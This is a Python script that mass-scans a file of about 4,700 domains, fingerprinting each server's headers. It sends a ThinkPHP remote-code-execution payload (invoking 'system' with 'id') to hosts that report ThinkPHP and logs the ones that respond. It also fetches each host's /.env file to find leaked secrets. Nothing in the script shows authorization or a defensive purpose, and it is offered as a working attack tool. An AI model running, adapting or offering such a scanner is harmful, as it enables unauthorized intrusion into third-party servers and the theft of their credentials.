import subprocess, json, re, time

ALL = "/tmp/all_4719_domains.txt"
OUTPUT = "/tmp/phase2_scan_results.json"
LOG = "/tmp/phase2_scan.log"

def log(msg):
    t = time.strftime("%H:%M:%S")
    with open(LOG, "a") as f: f.write(f"[{t}] {msg}\n")

def curl(url, timeout=8):
    cmd = ["curl", "-sk", "--connect-timeout", "5", "--max-time", str(timeout),
           "-o", "/tmp/b.tmp", "-D", "/tmp/h.tmp", "-w", "%{http_code}", url]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        code = r.stdout.strip()
        try:
            with open("/tmp/h.tmp") as f: hdrs = f.read()
        except: hdrs = ""
        try:
            with open("/tmp/b.tmp") as f: body = f.read(2000)
        except: body = ""
        return code, body, hdrs
    except:
        return "000", "", ""

log("CONTINUE SCAN - remaining domains")
with open(ALL) as f: all_d = [l.strip() for l in f if l.strip()]
try:
    with open(OUTPUT) as f: results = json.load(f)
except:
    results = {}

remaining = [d for d in all_d if d not in results]
log(f"Remaining: {len(remaining)}")

count = 0
for domain in remaining:
    count += 1
    info = {"alive": False}
    code, body, hdrs = curl(f"http://{domain}/")
    if code in ["000", ""]:
        results[domain] = info
        continue
    info["alive"] = True
    
    for line in hdrs.split("\n"):
        l = line.strip().lower()
        if l.startswith("server:"): info["server"] = l[7:].strip()[:100]
        if l.startswith("x-powered-by:"):
            pw = l[14:].strip()[:100]
            info["powered"] = pw
            if "thinkphp" in pw.lower():
                info["cms"] = "ThinkPHP"
                rce_code, rce_body, _ = curl(f"http://{domain}/index.php?s=captcha&_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=id", 6)
                if "uid=" in rce_body:
                    info["hits"] = info.get("hits", []) + [{"type": "ThinkPHP_RCE"}]
                    log(f"[!] THINKPHP RCE: {domain}")
            if "pboot" in pw.lower():
                info["cms"] = "PbootCMS"
                log(f"[*] PbootCMS: {domain}")
            if "php/" in pw.lower():
                log(f"[*] PHP: {domain}")
    
    code2, body2, _ = curl(f"http://{domain}/.env", 5)
    if code2 == "200" and len(body2) > 10:
        info["hits"] = info.get("hits", []) + [{"type": "env_leak"}]
        log(f"[!] .ENV: {domain}")
    
    results[domain] = info
    
    if count % 200 == 0:
        alive = sum(1 for v in results.values() if v.get("alive"))
        log(f"Progress: {len(results)} total | Alive: {alive}")
        with open(OUTPUT, "w") as f: json.dump(results, f)
    
    if count >= 4000: break

with open(OUTPUT, "w") as f: json.dump(results, f)
alive = sum(1 for v in results.values() if v.get("alive"))
hits = sum(1 for v in results.values() if len(v.get("hits", [])) > 0)
log(f"DONE: {len(results)} total | Alive: {alive} | Hits: {hits}")
